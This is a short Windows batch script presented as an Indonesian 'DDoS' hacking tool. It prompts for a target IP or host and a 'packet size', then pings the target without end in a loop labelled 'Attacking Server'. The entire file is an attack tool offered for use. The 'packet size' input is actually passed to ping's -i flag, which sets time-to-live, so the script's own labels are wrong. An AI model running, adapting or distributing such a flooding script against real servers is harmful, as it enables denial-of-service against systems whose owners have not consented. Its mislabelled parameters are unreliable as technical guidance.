@echo off
mode 80,20
title DDOS Attacking Server
color 0c
cls
echo.
color 0a
echo ======================
echo = MTX16 XCyberCoder's =
echo ======================
echo.
color 0c
echo ============================================== +++++++++++++++++++++
echo = Hacking~Tools*Indonesia-XCyberCoder's DDoS = { MTX16 } +
echo ============================================== +++++++++++++++++++++
echo.
color 0c
echo +++++++++++++++++++++++++++++++++++++++++++++++++++
echo + Name : DDOS Attacking Server *      *     *     +
echo + Author : XCyberCoder's          *      *    *   +
echo +++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
goto Next
echo.
echo DDOS With Batchfile
echo.
set /p x=Server-Target:
echo.
ping %x%
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo **********************************
echo *    Enter IP / Host Target    *
echo **********************************
echo.
set /p m=ip Host:
echo **********************************
echo * Packet Size  *
echo **********************************
echo.
set /p n=Packet Size:
echo.
:DDOS
color 0c
echo Attacking Server %m%
ping %m% -i %n% -t >nul
goto DDOS
